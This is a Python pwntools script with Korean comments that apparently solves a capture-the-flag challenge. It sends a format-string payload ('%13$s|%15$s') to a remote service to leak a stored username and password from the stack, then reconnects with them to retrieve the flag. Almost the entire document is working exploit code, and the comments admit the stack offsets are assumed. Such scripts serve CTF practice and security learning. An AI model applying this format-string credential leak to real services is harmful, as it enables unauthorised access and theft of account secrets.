from pwn import *

# 이 스크립트는 포맷 스트링 취약점을 이용하여 스택에서 username과 password를 유출합니다.
# 그리고 유출된 정보를 사용하여 두 번째 연결에서 로그인하여 플래그를 획득합니다.

# --- 1단계: 정보 유출 ---

log.info("1단계 시작: 계정 정보 유출")

# 원격 서버에 연결
try:
    p = remote("involuntaryctf.net", 6235, timeout=5)
except PwnlibException as e:
    log.error(f"연결 실패: {e}")
    exit(1)

# C 코드는 스택에 다음 순서로 변수를 선언합니다:
# flag, username, password, inputUsername, inputPassword
# 스택에서는 (높은 주소 -> 낮은 주소) 일반적으로 다음과 같이 배치됩니다:
# ... inputPassword, inputUsername, password, username, flag ...
#
# 우리의 포맷 스트링은 `inputUsername`에 있습니다. 우리는 더 높은 주소에 있는 `password`와 `username`을 읽어야 합니다.
# x86-64에서 처음 6개의 인자는 레지스터를 통해 전달되므로 스택 인자는 오프셋 6부터 시작합니다.
# `username`과 `password`에 대한 오프셋을 찾아야 합니다.
# 실험 또는 추측을 통해 정확한 오프셋을 결정할 수 있습니다.
# 여기서는 username이 오프셋 13에, password가 15에 있다고 가정합니다.
payload = b"%13$s|%15$s"
log.info(f"username과 password 유출을 위한 페이로드 전송: {payload}")

p.recvuntil(b"Enter username:")
p.sendline(payload)

p.recvuntil(b"Enter password:")
p.sendline(b"dummy_password") # 1단계에서는 중요하지 않음

# 유출된 데이터 수신
try:
    p.recvuntil(b"Hello ")
    leaked_data = p.recvline().decode().strip()
    log.success(f"유출된 데이터: {leaked_data}")
    p.close()
except EOFError:
    log.error("연결이 예기치 않게 종료되었습니다. 페이로드로 인해 프로그램이 충돌했을 수 있습니다.")
    log.error("페이로드의 포맷 스트링 오프셋을 조정해 보세요.")
    exit(1)

# 유출된 계정 정보 파싱
# 출력 형식은 "leaked_username|leaked_password"입니다.
try:
    parts = leaked_data.split('|')
    # fgets는 개행 문자를 포함하여 읽으므로 제거해야 합니다.
    username = parts[0].strip()
    password = parts[1].strip()

    if not username or not password:
        raise ValueError("유출된 문자열이 비어 있습니다.")

    log.success(f"추출된 Username: '{username}'")
    log.success(f"추출된 Password: '{password}'")
except (IndexError, ValueError) as e:
    log.error(f"유출된 데이터 파싱 실패: {leaked_data}")
    log.error("포맷 스트링 오프셋이 잘못되었을 가능성이 높습니다. 스택을 분석하고 조정하세요.")
    exit(1)


# --- 2단계: 유출된 정보로 로그인 ---

log.info("2단계 시작: 유출된 정보로 로그인")

try:
    p = remote("involuntaryctf.net", 6235, timeout=5)
except PwnlibException as e:
    log.error(f"2단계 연결 실패: {e}")
    exit(1)

p.recvuntil(b"Enter username:")
p.sendline(username.encode())

p.recvuntil(b"Enter password:")
p.sendline(password.encode())

# 성공 메시지 확인 후 플래그 출력
try:
    p.recvuntil(b"Welcome admin\n", timeout=2)
    flag = p.recvline().strip().decode()
    log.success(f"FLAG: {flag}")
except EOFError:
    log.warning("로그인 실패. 추출된 계정 정보와 익스플로잇 로직을 다시 확인하세요.")
    # 디버깅을 위해 서버 응답 출력
    log.info(f"서버 응답: {p.recvall(timeout=1).decode()}")

p.close()

